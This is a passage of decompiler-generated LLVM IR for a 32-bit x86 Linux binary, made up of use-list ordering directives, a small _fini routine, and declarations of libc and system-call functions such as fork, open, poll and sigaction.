  uselistorder i32 ptrtoint (i32* @global_var_8052000.69 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 24, 25, 53, 156, 54, 157, 265, 158, 159, 160, 55, 161, 163, 162, 51, 4, 164, 165, 26, 14, 48, 166, 266, 167, 56, 57, 168, 58, 169, 145, 170, 59, 171, 172, 118, 61, 60, 173, 174, 175, 63, 62, 64, 176, 146, 9, 177, 178, 65, 66, 10, 147, 179, 267, 180, 67, 68, 181, 11, 182, 12, 268, 269, 13, 183, 184, 270, 1, 27, 28, 0, 185, 154, 155, 186, 187, 188, 5, 115, 69, 189, 275, 70, 71, 190, 72, 29, 19, 73, 22, 191, 192, 30, 31, 32, 76, 75, 74, 193, 113, 114, 18, 17, 16, 194, 195, 77, 196, 6, 277, 197, 278, 279, 198, 199, 280, 200, 20, 201, 202, 203, 78, 281, 204, 79, 205, 2, 206, 207, 282, 34, 283, 35, 284, 285, 208, 133, 134, 135, 125, 127, 128, 129, 130, 131, 132, 126, 7, 124, 116, 209, 121, 122, 123, 136, 137, 120, 138, 139, 140, 141, 142, 143, 144, 117, 119, 33, 210, 286, 287, 211, 288, 289, 297, 80, 212, 81, 213, 49, 50, 214, 82, 83, 215, 84, 216, 85, 217, 86, 218, 87, 219, 88, 220, 89, 221, 90, 222, 91, 223, 92, 224, 36, 225, 52, 93, 226, 95, 94, 96, 227, 97, 228, 21, 229, 148, 230, 298, 231, 232, 37, 292, 293, 40, 39, 41, 42, 23, 43, 98, 44, 233, 38, 294, 8, 234, 235, 236, 149, 237, 45, 290, 291, 99, 273, 274, 15, 276, 100, 238, 101, 239, 102, 240, 103, 241, 104, 242, 105, 243, 106, 244, 107, 245, 108, 246, 109, 247, 110, 248, 111, 249, 112, 250, 46, 251, 150, 252, 253, 271, 272, 296, 295, 254, 151, 255, 47, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 152, 153 }
  uselistorder i32 1, { 358, 360, 359, 102, 240, 241, 80, 81, 79, 82, 277, 228, 362, 361, 83, 84, 363, 106, 573, 364, 107, 108, 301, 574, 575, 576, 242, 303, 577, 365, 578, 243, 579, 580, 377, 376, 375, 374, 373, 372, 371, 370, 369, 368, 367, 366, 169, 170, 166, 162, 167, 161, 165, 163, 164, 168, 581, 582, 0, 49, 48, 47, 46, 45, 378, 171, 172, 379, 17, 18, 152, 583, 584, 380, 104, 103, 105, 244, 381, 16, 585, 382, 73, 77, 78, 74, 76, 75, 586, 278, 385, 384, 383, 655, 212, 570, 656, 208, 657, 151, 658, 245, 659, 660, 150, 661, 662, 587, 588, 356, 386, 101, 589, 387, 388, 279, 663, 345, 173, 590, 591, 571, 247, 592, 593, 594, 595, 596, 598, 599, 600, 248, 601, 602, 337, 246, 603, 249, 604, 605, 606, 597, 392, 391, 390, 389, 128, 130, 129, 125, 127, 126, 131, 607, 393, 88, 85, 87, 86, 250, 394, 608, 609, 396, 395, 99, 98, 610, 611, 231, 230, 227, 612, 280, 613, 614, 229, 615, 251, 616, 304, 617, 398, 397, 8, 10, 9, 11, 252, 305, 1, 306, 399, 817, 818, 819, 96, 97, 95, 402, 401, 400, 12, 403, 404, 153, 202, 253, 254, 664, 214, 665, 332, 666, 667, 668, 213, 669, 232, 346, 63, 62, 670, 671, 406, 405, 174, 672, 407, 673, 408, 175, 674, 675, 409, 176, 177, 618, 619, 620, 621, 622, 623, 624, 625, 626, 413, 412, 411, 347, 410, 348, 92, 90, 91, 93, 627, 628, 415, 414, 349, 350, 67, 69, 68, 70, 72, 71, 281, 676, 677, 203, 276, 678, 679, 255, 680, 300, 681, 683, 416, 155, 2, 3, 687, 684, 685, 686, 215, 417, 118, 117, 420, 419, 418, 100, 421, 688, 422, 112, 642, 643, 644, 256, 645, 689, 690, 691, 423, 196, 195, 192, 193, 194, 302, 692, 693, 694, 695, 257, 113, 307, 308, 309, 696, 424, 310, 311, 697, 258, 4, 426, 425, 178, 312, 427, 144, 428, 134, 133, 820, 430, 429, 179, 180, 282, 821, 431, 181, 313, 200, 314, 698, 699, 700, 701, 702, 703, 704, 705, 237, 706, 435, 434, 433, 432, 159, 160, 315, 707, 708, 316, 317, 709, 437, 436, 438, 182, 439, 158, 318, 440, 204, 710, 711, 210, 712, 259, 216, 217, 713, 714, 209, 715, 716, 717, 718, 719, 260, 443, 442, 441, 720, 721, 722, 723, 724, 725, 726, 727, 207, 233, 728, 261, 729, 730, 731, 262, 732, 733, 263, 734, 735, 736, 737, 738, 319, 357, 445, 444, 51, 50, 52, 283, 284, 789, 790, 791, 792, 218, 646, 647, 648, 446, 114, 739, 740, 741, 448, 447, 66, 65, 64, 449, 822, 450, 34, 33, 35, 451, 89, 452, 156, 453, 149, 454, 111, 456, 455, 135, 457, 183, 458, 137, 459, 184, 460, 185, 461, 186, 462, 464, 463, 109, 465, 115, 467, 466, 138, 468, 472, 471, 470, 469, 142, 823, 824, 825, 474, 473, 61, 60, 826, 285, 476, 475, 478, 477, 187, 286, 338, 569, 320, 479, 649, 650, 651, 336, 652, 480, 55, 56, 54, 57, 287, 481, 58, 59, 742, 205, 211, 743, 351, 482, 42, 44, 41, 43, 483, 23, 20, 19, 21, 25, 24, 22, 30, 27, 29, 31, 26, 28, 321, 485, 484, 322, 486, 323, 487, 324, 489, 488, 339, 492, 491, 490, 188, 325, 749, 750, 751, 493, 132, 752, 753, 219, 754, 755, 756, 38, 36, 37, 340, 748, 264, 189, 191, 190, 326, 757, 758, 759, 760, 761, 762, 763, 764, 765, 265, 766, 767, 768, 769, 770, 290, 771, 772, 201, 291, 773, 774, 775, 776, 288, 289, 777, 778, 779, 496, 495, 494, 121, 120, 119, 123, 122, 292, 293, 497, 294, 295, 266, 501, 500, 499, 498, 139, 341, 502, 503, 504, 505, 506, 744, 234, 745, 327, 238, 328, 746, 235, 511, 510, 509, 508, 507, 39, 40, 512, 513, 638, 639, 515, 514, 15, 14, 13, 682, 516, 518, 517, 94, 519, 154, 521, 520, 53, 522, 157, 523, 136, 525, 524, 124, 526, 141, 527, 197, 529, 528, 116, 530, 143, 532, 531, 140, 533, 148, 145, 629, 220, 221, 334, 239, 630, 5, 6, 206, 333, 631, 632, 633, 634, 635, 636, 296, 267, 637, 329, 342, 539, 538, 537, 536, 535, 534, 352, 146, 147, 343, 640, 641, 540, 653, 654, 572, 542, 541, 198, 747, 545, 544, 543, 780, 781, 546, 297, 330, 268, 782, 783, 552, 551, 550, 549, 548, 547, 784, 785, 236, 298, 786, 269, 270, 787, 788, 555, 554, 553, 353, 199, 793, 794, 556, 558, 557, 795, 796, 797, 805, 806, 226, 807, 560, 559, 110, 331, 7, 562, 561, 354, 271, 798, 223, 799, 800, 272, 801, 222, 803, 804, 273, 299, 344, 802, 355, 808, 563, 809, 810, 32, 811, 812, 274, 813, 814, 815, 224, 565, 564, 275, 816, 335, 225, 567, 566, 568 }
  uselistorder label %dec_label_pc_804fcb6, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_804fccb = load i32, i32* @ebx, align 4
  %v1_804fccc = call i32 @__get_pc_thunk_bx(i32 %v0_804fccb)
  store i32 %v1_804fccc, i32* @eax, align 4
  %v0_804fcd7 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_804fcd7

; uselistorder directives
  uselistorder i32* @eax, { 51, 53, 54, 80, 55, 57, 56, 58, 59, 61, 52, 60, 3, 24, 82, 0, 5, 83, 84, 4, 85, 1, 23, 2, 81, 86, 25, 87, 62, 63, 65, 18, 64, 88, 90, 89, 7, 8, 91, 92, 93, 26, 94, 95, 96, 97, 98, 99, 100, 101, 102, 27, 103, 104, 105, 28, 29, 106, 30, 107, 31, 32, 108, 131, 148, 109, 33, 110, 34, 111, 112, 113, 35, 114, 6, 36, 37, 115, 116, 38, 117, 39, 118, 119, 40, 41, 42, 120, 121, 122, 123, 43, 124, 125, 126, 127, 44, 150, 49, 151, 152, 154, 50, 155, 9, 153, 12, 17, 149, 128, 19, 66, 67, 68, 69, 132, 134, 135, 133, 136, 137, 139, 140, 138, 129, 45, 10, 20, 70, 71, 72, 73, 74, 21, 22, 75, 76, 77, 78, 47, 48, 79, 13, 130, 46, 14, 141, 142, 15, 143, 144, 145, 156, 146, 147, 11, 16 }
  uselistorder i32 0, { 442, 443, 99, 444, 445, 446, 11, 200, 101, 100, 447, 448, 201, 449, 450, 451, 360, 452, 453, 454, 455, 622, 85, 456, 102, 457, 16, 86, 78, 458, 178, 103, 459, 79, 460, 361, 461, 244, 462, 463, 464, 465, 466, 467, 468, 469, 104, 362, 470, 471, 472, 473, 105, 474, 363, 106, 175, 245, 107, 364, 365, 366, 202, 475, 476, 477, 478, 203, 195, 196, 479, 480, 481, 482, 483, 484, 367, 204, 485, 108, 368, 486, 109, 205, 206, 487, 488, 246, 623, 624, 625, 369, 489, 490, 491, 492, 110, 111, 370, 626, 112, 627, 371, 87, 493, 179, 372, 373, 374, 494, 113, 495, 628, 12, 13, 14, 46, 375, 629, 632, 630, 631, 376, 633, 114, 115, 496, 497, 90, 498, 116, 377, 499, 180, 500, 47, 117, 501, 502, 503, 634, 635, 636, 207, 637, 504, 505, 506, 507, 508, 509, 510, 511, 512, 118, 378, 513, 208, 514, 515, 516, 517, 518, 17, 18, 379, 197, 198, 519, 520, 521, 522, 19, 523, 524, 525, 20, 380, 526, 21, 22, 119, 381, 527, 528, 529, 532, 530, 531, 23, 44, 48, 533, 534, 535, 536, 240, 537, 538, 120, 539, 121, 540, 382, 181, 541, 122, 542, 383, 543, 544, 546, 547, 548, 549, 550, 551, 123, 384, 385, 124, 552, 553, 386, 554, 555, 556, 557, 558, 387, 559, 560, 209, 388, 210, 561, 562, 563, 564, 565, 566, 24, 49, 50, 51, 389, 567, 125, 390, 568, 341, 569, 570, 126, 391, 83, 42, 74, 545, 182, 75, 818, 819, 820, 821, 80, 183, 211, 571, 823, 25, 53, 640, 647, 641, 642, 26, 43, 643, 644, 645, 392, 646, 52, 91, 92, 93, 638, 639, 127, 648, 649, 651, 652, 650, 653, 212, 654, 655, 656, 657, 658, 659, 128, 129, 393, 247, 248, 77, 572, 394, 573, 574, 56, 57, 575, 576, 577, 353, 578, 55, 395, 54, 396, 130, 0, 1, 397, 131, 132, 398, 399, 400, 133, 401, 662, 402, 660, 191, 661, 249, 250, 134, 2, 3, 403, 663, 664, 665, 666, 667, 251, 404, 405, 213, 824, 825, 135, 668, 27, 58, 611, 81, 82, 406, 669, 59, 407, 28, 136, 670, 60, 408, 671, 409, 673, 672, 184, 410, 411, 674, 676, 675, 185, 412, 677, 826, 827, 186, 829, 828, 61, 252, 413, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 214, 688, 414, 415, 689, 137, 690, 416, 691, 692, 756, 138, 417, 139, 253, 693, 694, 695, 696, 88, 29, 697, 62, 698, 699, 700, 701, 702, 703, 709, 710, 711, 712, 704, 705, 706, 707, 708, 63, 64, 418, 713, 714, 65, 66, 67, 419, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 140, 795, 796, 141, 797, 798, 799, 68, 89, 215, 94, 420, 733, 216, 217, 590, 831, 832, 757, 758, 759, 254, 760, 833, 95, 218, 761, 834, 580, 579, 835, 836, 837, 581, 582, 838, 788, 839, 142, 840, 845, 846, 15, 30, 421, 31, 98, 422, 423, 855, 856, 187, 857, 143, 342, 255, 256, 852, 4, 841, 842, 843, 144, 440, 352, 844, 612, 613, 614, 615, 424, 425, 616, 241, 426, 219, 145, 146, 427, 583, 428, 584, 147, 429, 148, 430, 735, 69, 736, 737, 738, 5, 431, 734, 257, 585, 586, 587, 588, 432, 149, 847, 343, 150, 220, 848, 851, 850, 764, 765, 766, 767, 768, 221, 769, 770, 771, 258, 762, 259, 763, 260, 433, 434, 261, 344, 435, 262, 345, 151, 436, 772, 773, 152, 153, 263, 346, 97, 774, 775, 776, 154, 155, 264, 347, 96, 777, 188, 778, 84, 779, 780, 782, 437, 781, 6, 589, 7, 849, 591, 592, 593, 594, 596, 595, 739, 438, 222, 740, 439, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 800, 45, 822, 156, 597, 858, 789, 598, 830, 859, 860, 783, 752, 599, 853, 854, 176, 600, 177, 192, 157, 158, 223, 265, 159, 354, 601, 160, 224, 602, 603, 266, 604, 267, 348, 161, 605, 349, 10, 606, 225, 607, 242, 608, 609, 610, 226, 227, 193, 194, 355, 617, 356, 268, 618, 620, 269, 270, 619, 70, 621, 357, 199, 272, 162, 271, 350, 351, 163, 753, 754, 755, 228, 358, 273, 784, 164, 165, 166, 167, 229, 785, 168, 169, 230, 786, 787, 170, 790, 791, 792, 359, 231, 171, 172, 233, 793, 173, 232, 794, 234, 32, 801, 802, 803, 274, 275, 813, 33, 34, 76, 35, 237, 238, 804, 805, 806, 807, 189, 235, 236, 239, 808, 809, 810, 811, 36, 37, 71, 812, 243, 38, 39, 814, 72, 40, 41, 73, 276, 277, 8, 9, 815, 816, 817, 174, 441, 190, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 861, 862, 863, 864, 865, 866, 867, 868 }
  uselistorder i32* @ebx, { 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 212, 213, 49, 50, 51, 52, 4, 53, 54, 55, 5, 56, 6, 57, 58, 214, 7, 215, 216, 217, 8, 218, 219, 220, 221, 222, 223, 224, 59, 60, 9, 61, 62, 63, 64, 65, 66, 67, 225, 226, 227, 228, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 229, 230, 231, 232, 10, 233, 11, 234, 235, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 116, 117, 12, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 13, 131, 132, 133, 134, 135, 35, 36, 37, 38, 111, 113, 112, 114, 115, 433, 434, 14, 435, 436, 439, 440, 136, 137, 138, 139, 140, 141, 441, 442, 443, 236, 238, 241, 242, 243, 244, 245, 239, 237, 240, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 266, 267, 1, 268, 269, 270, 271, 272, 273, 274, 444, 445, 446, 447, 448, 449, 450, 451, 452, 275, 276, 194, 195, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 453, 15, 454, 455, 456, 457, 30, 16, 28, 458, 459, 460, 461, 462, 463, 297, 298, 299, 300, 301, 302, 17, 303, 18, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 367, 368, 20, 318, 316, 317, 319, 322, 320, 321, 323, 324, 325, 19, 327, 326, 2, 328, 329, 330, 331, 332, 333, 21, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 170, 171, 172, 467, 468, 469, 470, 369, 22, 370, 371, 471, 472, 372, 373, 473, 154, 474, 475, 476, 477, 478, 155, 479, 425, 426, 374, 375, 376, 480, 481, 482, 33, 34, 0, 485, 486, 487, 500, 501, 502, 503, 31, 23, 29, 488, 494, 498, 499, 483, 484, 206, 207, 156, 157, 158, 159, 160, 161, 348, 351, 24, 3, 352, 349, 350, 163, 353, 354, 355, 162, 164, 165, 492, 493, 166, 167, 168, 169, 377, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 25, 392, 393, 378, 379, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 32, 405, 406, 407, 408, 409, 26, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 490, 491, 173, 174, 175, 356, 357, 358, 359, 360, 361, 27, 362, 363, 364, 437, 438, 176, 177, 178, 504, 505, 427, 428, 179, 180, 181, 464, 465, 466, 506, 507, 508, 509, 420, 421, 365, 366, 182, 183, 184, 489, 495, 496, 497, 185, 186, 187, 188, 189, 190, 191, 192, 193, 208, 209, 210, 211, 422, 423, 424, 510, 511, 512, 513, 429, 430, 431, 432 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
